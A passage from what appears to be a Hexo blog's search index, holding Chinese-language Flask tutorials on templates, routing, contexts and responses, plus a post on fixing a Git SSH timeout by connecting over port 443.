class="string">'500.html'</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        old_name = session.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">if</span> old_name <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> old_name != form.name.data:</span><br><span class="line">            flash(<span class="string">'Looks like you have changed your name!'</span>)</span><br><span class="line">        session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form, name=session.get(<span class="string">'name'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask之模板</title>
      <link href="/2019/01/16/flask%E4%B9%8B%E6%A8%A1%E6%9D%BF/"/>
      <url>/2019/01/16/flask%E4%B9%8B%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p>flask深入学习之第二部分<br><a id="more"></a></p><h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><p>模板是一个包含响应文本的文件，其中包含用占位变量表示的动态部分，其具体值只在请求的上下文中才能知道。使用真实值替换变量，再返回最终得到的响应字符串，这一过程称为<strong>渲染</strong>。为了渲染模板，Flask使用了一个名为Jinja2的强大模板引擎。</p><h3 id="Jinja2模板引擎"><a href="#Jinja2模板引擎" class="headerlink" title="Jinja2模板引擎"></a>Jinja2模板引擎</h3><p>形式最简单的Jinja2模板就是一个包含响应文本的文件。例如：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>或者是响应中包含变量，<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> <span class="comment">&lt;!-- name即为其中的变量 --&gt;</span></span><br></pre></td></tr></table></figure></p><p>默认情况下，Flask在程序文件夹中的<code>templates</code>子文件夹中寻找模板。把前面定义的模板保存在templates文件夹中，并分别命名为index.html和user.html。例如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/user/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'user.html'</span>, name=name)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p><p>Flask提供的render_template函数把Jinja2模板引擎集成到了程序中。<code>render_template</code>函数的第一个参数是模板的文件名。随后的参数都是键值对，表示模板中变量对应的真实值。在这段代码中，第二个模板收到一个名为name的变量。在模板中使用的结构表示一个变量，它是一种特殊的占位符，告诉模板引擎这个位置的值从渲染模板时使用的数据中获取。Jinja2能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。</p><p>可以使用<strong>过滤器</strong>修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, &#123;&#123; name|capitalize &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>下表为Jinja2提供的常见过滤器<br>过滤器名|说明<br>-|-|<br>safe|渲染值时不转义<br>capitalize|把值的首字母转换成大写，其他字母转换成小写<br>lower|把值转换成小写形式<br>upper|把值转换成大写形式<br>title|把值中每个单词的首字母都转换成大写<br>trim|把值的首尾空格去掉<br>striptags|渲染之前把值中所有的HTML标签都删掉</p><p>safe过滤器值得特别说明一下。默认情况下，出于安全考虑，<strong>Jinja2会转义所有变量</strong>。例如，如果一个变量的值为<code>&lt;h1&gt;Hello&lt;/h1&gt;</code>，Jinja2会将其渲染成<code>&amp;lt;h1&amp;gt;Hello&amp;lt;/h1&amp;gt;</code>，浏览器能显示这个h1元素，但不会进行解释。很多情况下需要显示变量中存储的HTML代码，这时就可使用safe过滤器。</p><blockquote><p>千万别在不可信的值上使用safe过滤器，例如用户在表单中输入的文本。</p></blockquote><p>Jinja2提供了多种控制结构，可用来改变模板的渲染流程。</p><pre><code>- 使用条件控制语句。</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> user %&#125;</span><br><span class="line">    Hello, &#123;&#123; user &#125;&#125;!</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">    Hello, Stranger!</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><pre><code>- for循环，常见需求是在模板中渲染一组元素。</code></pre><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% <span class="keyword">for</span> comment <span class="keyword">in</span> comments %&#125;</span><br><span class="line">        &lt;li&gt;&#123;&#123; comment &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><ul><li>Jinja2还支持宏。宏类似于Python代码中的函数。<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro render_comment(comment) %&#125;</span><br><span class="line">    &lt;li&gt;&#123;&#123; comment &#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endmacro %&#125;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% <span class="keyword">for</span> comment <span class="keyword">in</span> comments %&#125;</span><br><span class="line">        &#123;&#123; render_comment(comment) &#125;&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></li></ul><p>为了重复使用宏，我们可以将其保存在单独的文件中，然后在需要使用的模板中导入：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> <span class="string">'macros.html'</span> <span class="keyword">as</span> macros %&#125;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% <span class="keyword">for</span> comment <span class="keyword">in</span> comments %&#125;</span><br><span class="line">        &#123;&#123; macros.render_comment(comment) &#125;&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></p><p>需要在多处重复使用的模板代码片段可以写入单独的文件，再包含在所有模板中，以避免重复：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include <span class="string">'common.html'</span> %&#125;</span><br></pre></td></tr></table></figure></p><p>另一种重复使用代码的强大方式是模板继承，它类似于Python代码中的类继承。首先，创建一个名为<code>base.html</code>的基模板：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock %&#125; - My Application<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>block标签定义的元素可在衍生模板中修改。在本例中，我们定义了名为head、title和body的块。注意，<strong>title包含在head中</strong>。下面这个示例是基模板的衍生模板：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line">&#123;% block title %&#125;Index&#123;% endblock %&#125;</span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line">&#123;&#123; super() &#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></p><p><code>extends</code>指令声明这个模板衍生自base.html。在extends指令之后，基模板中的3个块被重新定义，模板引擎会将其插入适当的位置。注意新定义的head块，在基模板中其内容不是空的，所以使用<code>super()</code>获取原来的内容。</p><h3 id="自定义错误页面"><a href="#自定义错误页面" class="headerlink" title="自定义错误页面"></a>自定义错误页面</h3><p>Flask允许程序使用基于模板的自定义错误页面。最常见的错误代码有两个：</p><ul><li>404，客户端请求未知页面或路由时显示；</li><li>500，有未处理的异常时显示。<br>为这两个错误代码指定自定义处理程序的方式如下所示：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'404.html'</span>), <span class="number">404</span></span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_server_error</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'500.html'</span>), <span class="number">500</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><p>使用模板继承可以避免大量的体力劳动</p></blockquote><h3 id="链接与静态文件"><a href="#链接与静态文件" class="headerlink" title="链接与静态文件"></a>链接与静态文件</h3><p>任何具有多个路由的程序都需要可以连接不同页面的链接，在模板中直接编写简单路由的URL链接不难，但对于包含可变部分的动态路由，在模板中构建正确的URL就很困难。为了避免这些问题，Flask提供了<code>url_for()</code>辅助函数，它可以使用程序URL映射中保存的信息生成URL。<code>url_for()</code>函数最简单的用法是以视图函数名（<em>或者app.add_url_route()定义路由时使用的端点名</em>）作为参数，返回对应的URL。例如，在当前版本的hello.py程序中调用url_for(‘index’)得到的结果是/。调用<code>url_for(&#39;index&#39;, _external=True)</code>返回的则是<strong>绝对地址</strong>，在这个示例中是<a href="http://localhost:5000/。" target="_blank" rel="noopener">http://localhost:5000/。</a><br>使用url_for()生成动态地址时，将动态部分作为关键字参数传入。例如，url_for(‘user’, name=’john’, _external=True)的返回结果是<a href="http://localhost:5000/user/john。传入url_for()的关键字参数不仅限于动态路由中的参数。函数能将任何额外参数添加到查询字符串中。例如，`url_for" target="_blank" rel="noopener">http://localhost:5000/user/john。传入url_for()的关键字参数不仅限于动态路由中的参数。函数能将任何额外参数添加到查询字符串中。例如，`url_for</a>(‘index’, page=2)`的返回结果是/?page=2。</p><p>Web程序不是仅由Python代码和模板组成。大多数程序还会使用静态文件，例如HTML代码中引用的图片、JavaScript源码文件和CSS。默认设置下，Flask在程序根目录中名为<code>static</code>的子目录中寻找静态文件。如果需要，可在static文件夹中使用子文件夹存放文件。例如：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block head %&#125;</span><br><span class="line">&#123;&#123; super() &#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for('static', filename = 'favicon.ico') &#125;&#125;"</span></span></span><br><span class="line"><span class="tag"><span class="attr">type</span>=<span class="string">"image/x-icon"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for('static', filename = 'favicon.ico') &#125;&#125;"</span></span></span><br><span class="line"><span class="tag"><span class="attr">type</span>=<span class="string">"image/x-icon"</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask之程序基本架构</title>
      <link href="/2019/01/16/flask%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84/"/>
      <url>/2019/01/16/flask%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>flask作为比较著名的python开发框架，掌握它才能更好的对其做出测试<br><a id="more"></a></p><h1 id="程序基本架构"><a href="#程序基本架构" class="headerlink" title="程序基本架构"></a>程序基本架构</h1><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>所有Flask程序都必须创建一个程序实例。Web服务器使用一种名为Web服务器网关接口（Web Server Gateway Interface，WSGI）的协议，把接收自客户端的所有请求都转交给这个对象处理。程序实例是Flask类的对象，经常使用下述代码创建：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure></p><p>Flask类的构造函数只有一个必须指定的参数，即程序主模块或包的名字。在大多数程序中，Python的<strong>name</strong>变量就是所需的值。name用来决定程序的根目录。</p><hr><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>程序实例需要知道对每个URL请求运行哪些代码，所以保存了一个URL到Python函数的映射关系。<strong>处理URL和函数之间关系的程序称为路由</strong>。<br>在Flask程序中定义路由的最简便方式，是使用程序实例提供的app.route<code>修饰器</code>，把修饰的函数注册为路由。下面的例子说明了如何使用这个修饰器声明路由：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello World!&lt;/h1&gt;'</span></span><br></pre></td></tr></table></figure></p><blockquote><p>修饰器是Python语言的标准特性，可以使用不同的方式修改函数的行为。惯常用法是使用修饰器把函数注册为事件的处理程序。<br>Flask还支持动态的URL，只需要在<code>route</code>修饰器中使用特殊的语法即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/user/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello, %s!&lt;/h1&gt;'</span> % name</span><br></pre></td></tr></table></figure></p></blockquote><p>尖括号中的内容就是动态部分，任何能匹配静态部分的URL都会映射到这个路由上。路由中的动态部分默认使用字符串，不过也可使用类型定义。例如，路由<code>/user/&lt;int:id&gt;</code>只会匹配动态片段id为整数的URL。Flask支持在路由中使用int、float和path类型。path类型也是字符串，但不把斜线视作分隔符，而将其当作动态片段的一部分。</p><hr><h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><p>程序实例用run方法启动Flask集成的开发Web服务器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p><p><code>__name__==&#39;__main__&#39;</code>是Python的惯常用法，在这里确保直接执行这个脚本时才启动开发Web服务器。如果这个脚本由其他脚本引入，程序假定父级脚本会启动不同的服务器，因此不会执行app.run()。</p><blockquote><p>debug=True用来启动调试模式</p></blockquote><p>一个完整的例子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello World!&lt;/h1&gt;'</span></span><br><span class="line"><span class="meta">@app.route('/user/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello, %s!&lt;/h1&gt;'</span> % name</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p><p>输入<code>http://127.0.0.1:5000</code>查看是否正确。</p><hr><h3 id="程序和请求上下文"><a href="#程序和请求上下文" class="headerlink" title="程序和请求上下文"></a>程序和请求上下文</h3><p>为了避免大量可有可无的参数把视图函数弄得一团糟，Flask使用上下文临时把某些对象变为全局可访问。有了上下文，就可以写出下面的视图函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    user_agent = request.headers.get(<span class="string">'User-Agent'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;p&gt;Your browser is %s&lt;/p&gt;'</span> % user_agent</span><br></pre></td></tr></table></figure><p>注意在这个视图函数中我们如何把request当作全局变量使用。事实上，request不可能是全局变量。试想，在多线程服务器中，多个线程同时处理不同客户端发送的不同请求时，每个线程看到的request对象必然不同。<strong>Falsk使用上下文让特定的变量在一个线程中全局可访问，与此同时却不会干扰其他线程</strong>。在Flask中有两种上下文：<strong>程序上下文和请求上下文</strong>。下表为两种上下文提供的变量。</p><table><thead><tr><th>变量名</th><th>上下文</th><th>说明</th></tr></thead><tbody><tr><td>current_app</td><td>程序上下文</td><td>当前激活程序的程序实例</td></tr><tr><td>g</td><td>程序上下文</td><td>处理请求时用作临时存储的对象。每次请求都会重设这个变量</td></tr><tr><td>request</td><td>请求上下文</td><td>请求对象，封装了客户端发出的HTTP请求中的内容</td></tr><tr><td>session</td><td>请求上下文</td><td>用户会话，用于存储请求之间需要“记住”的值的词典</td></tr></tbody></table><p>Flask在分发请求之前激活（或推送）程序和请求上下文，请求处理完成后再将其删除。程序上下文被推送后，就可以在线程中使用<code>current_app</code>和<code>g</code>变量。类似地，请求上下文被推送后，就可以使用<code>request</code>和<code>session</code>变量。如果使用这些变量时我们没有激活程序上下文或请求上下文，就会导致错误。</p><hr><h3 id="请求钩子"><a href="#请求钩子" class="headerlink" title="请求钩子"></a>请求钩子</h3><p>在一个Client发出请求之前或者发出请求之后，在执行代码。请求钩子使用修饰器实现。Flask支持以下4种钩子。</p><ul><li>before_first_request：注册一个函数，在处理第一个请求之前运行。</li><li>before_request：注册一个函数，在每次请求之前运行。</li><li>after_request：注册一个函数，如果没有未处理的异常抛出，在每次请求之后运行。</li><li>teardown_request：注册一个函数，即使有未处理的异常抛出，也在每次请求之后运行。</li></ul><blockquote><p>在请求钩子函数和视图函数之间共享数据一般使用上下文全局变量g</p></blockquote><hr><h3 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h3><p>HTTP协议需要的不仅是作为请求响应的字符串。HTTP响应中一个很重要的部分是<code>状态码</code>，Flask默认设为200，这个代码表明请求已经被成功处理。如果视图函数返回的响应需要使用不同的状态码，那么可以把数字代码作为第二个返回值，添加到响应文本之后。例如，下述视图函数返回一个400状态码，表示请求无效：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Bad Request&lt;/h1&gt;'</span>, <span class="number">400</span></span><br></pre></td></tr></table></figure></p><p>Flask视图函数还可以返回Response对象。make_response()函数可接受1个、2个或3个参数（和视图函数的返回值一样），并返回一个Response对象。下例创建了一个相应对象，然后设置了COOKIE:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    response = make_response(<span class="string">'&lt;h1&gt;This document carries a cookie!&lt;/h1&gt;'</span>)</span><br><span class="line">    response.set_cookie(<span class="string">'answer'</span>, <span class="string">'42'</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure></p><p>重定向经常使用302 状态码表示，指向的地址由Location首部提供。重定向响应可以使用3个值形式的返回值生成，也可在Response对象中设定。不过，由于使用频繁，Flask提供了<code>redirect()</code>辅助函数，用于生成这种响应：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'http://www.example.com'</span>)</span><br></pre></td></tr></table></figure></p><p>还有一种特殊的响应由abort函数生成，用于处理错误。在下面这个例子中，如果URL中动态参数id对应的用户不存在，就返回状态码404：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort</span><br><span class="line"><span class="meta">@app.route('/user/&lt;id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user</span><span class="params">(id)</span>:</span></span><br><span class="line">    user = load_user(id)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello, %s&lt;/h1&gt;'</span> % user.name</span><br></pre></td></tr></table></figure></p><p>注意，<strong>abort不会把控制权交还给调用它的函数，而是抛出异常把控制权交给Web服务器</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 提交出现ssh connection time out</title>
      <link href="/2018/11/12/Git-%E6%8F%90%E4%BA%A4%E5%87%BA%E7%8E%B0ssh-connection-time-out/"/>
      <url>/2018/11/12/Git-%E6%8F%90%E4%BA%A4%E5%87%BA%E7%8E%B0ssh-connection-time-out/</url>
      
        <content type="html"><![CDATA[<p>提交文章发生了奇怪的错误<br><a id="more"></a></p><h3 id="突然的错误"><a href="#突然的错误" class="headerlink" title="突然的错误"></a>突然的错误</h3><p>我今天进行提交新的博文，突然提交不上去，<br>报错如图<br><img src="/2018/11/12/Git-提交出现ssh-connection-time-out/1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prot 22: Operation timed out</span><br></pre></td></tr></table></figure></p><p>初步判断为端口问题，那么除了ssh端口我们还可以用<strong>https 443</strong>端口</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>博主本机为<strong>win10</strong>，那么在<code>/git/etc/ssh/ssh_config</code>文件末尾增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User YourEmail@xx.com</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure><p>然后保存。<br>然后继续在git bash中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;XXX&quot;</span><br><span class="line">git config --global user.email xxxx@xx.com</span><br></pre></td></tr></table></figure></p><p>刷新就可以生效</p><hr><p><strong>linux</strong>中在<code>~/.ssh</code>新建<code>config</code>输入以下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User YourEmail@xx.com</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure></p><p>后续内容跟上面内容一样更新即可。最后运行<code>ssh -T 